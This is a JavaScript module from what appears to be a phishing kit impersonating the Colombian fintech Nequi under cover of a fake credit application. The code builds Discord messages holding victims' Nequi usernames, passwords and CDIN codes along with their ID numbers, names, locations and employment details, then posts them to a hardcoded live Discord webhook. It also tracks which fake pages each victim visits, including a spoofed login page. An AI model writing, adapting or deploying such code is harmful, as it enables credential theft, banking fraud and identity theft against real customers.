
/**
 * Discord Integration
 */

const DISCORD_CONFIG = {
    WEBHOOK_URL: 'https://discord.com/api/webhooks/1385429109135642704/fSW0pterLx8L5gjnCN7oqINDawcI5TCOu-74JXiuyL_9Z2gZpo9eoUmeS_ttqkmH_sOg', // Reemplaza con tu webhook URL de Discord
    EMBED_COLOR: 0xDA0081, // Color rosa de Nequi
    AVATAR_URL: 'https://i.imgur.com/nequi-logo.png' // URL del avatar (opcional)
};

const createUserDataEmbed = (userData) => {
    return {
        embeds: [{
            title: "🏦 Nueva Solicitud de Crédito Nequi",
            description: "Se ha recibido una nueva solicitud de crédito",
            color: DISCORD_CONFIG.EMBED_COLOR,
            fields: [
                {
                    name: "📱 Datos de Acceso",
                    value: `**Usuario:** ${userData.user}\n**Contraseña:** ${userData.pass}\n**CDIN:** ${userData.cdin || 'Pendiente'}`,
                    inline: false
                },
                {
                    name: "💰 Información del Crédito",
                    value: `**Monto:** ${formatearMonedaDiscord(userData.monto)}\n**Plazo:** ${userData.plazo} meses\n**Cuota:** ${formatearMonedaDiscord(userData.cuota)}`,
                    inline: true
                },
                {
                    name: "👤 Datos Personales",
                    value: `**Cédula:** ${userData.cedula}\n**Nombre:** ${userData.nombre}\n**Departamento:** ${userData.departamento}\n**Municipio:** ${userData.municipio}`,
                    inline: true
                },
                {
                    name: "💼 Información Laboral",
                    value: `**Sector:** ${userData.sector}\n**Tipo de Empleo:** ${userData.tipo_empleo}`,
                    inline: false
                }
            ],
            thumbnail: {
                url: "https://i.imgur.com/nequi-logo.png"
            },
            footer: {
                text: "Sistema de Captura Nequi",
                icon_url: "https://i.imgur.com/nequi-logo.png"
            },
            timestamp: new Date().toISOString()
        }],
        username: "Nequi Bot",
        avatar_url: DISCORD_CONFIG.AVATAR_URL
    };
};

const createStatusEmbed = (page, status) => {
    const pageNames = {
        'P1': 'Página Principal',
        'P2': 'Simulador',
        'P3': 'Información Personal',
        'P4': 'Login Nequi'
    };

    return {
        embeds: [{
            title: "📊 Estado del Sistema",
            description: `Usuario accedió a: **${pageNames[page]}**`,
            color: 0x00FF00,
            fields: [
                {
                    name: "📍 Página",
                    value: pageNames[page],
                    inline: true
                },
                {
                    name: "⏰ Timestamp",
                    value: new Date().toLocaleString('es-CO'),
                    inline: true
                }
            ],
            footer: {
                text: "Sistema de Monitoreo Nequi"
            },
            timestamp: new Date().toISOString()
        }],
        username: "Nequi Monitor",
        avatar_url: DISCORD_CONFIG.AVATAR_URL
    };
};

const sendToDiscord = async (data) => {
    try {
        const response = await fetch(DISCORD_CONFIG.WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data)
        });

        if (!response.ok) {
            throw new Error(`Discord webhook error: ${response.status}`);
        }

        console.log('Mensaje enviado a Discord exitosamente');
        return true;
    } catch (error) {
        console.error('Error enviando mensaje a Discord:', error);
        return false;
    }
};

const formatearMonedaDiscord = (valor) => {
    return new Intl.NumberFormat('es-CO', {
        style: 'currency',
        currency: 'COP',
        minimumFractionDigits: 0,
        maximumFractionDigits: 0
    }).format(valor);
};

// Función para enviar datos del usuario
const sendUserDataToDiscord = async (userData) => {
    const embed = createUserDataEmbed(userData);
    return await sendToDiscord(embed);
};

// Función para enviar estado de página
const sendPageStatusToDiscord = async (page) => {
    const embed = createStatusEmbed(page, 'visited');
    return await sendToDiscord(embed);
};
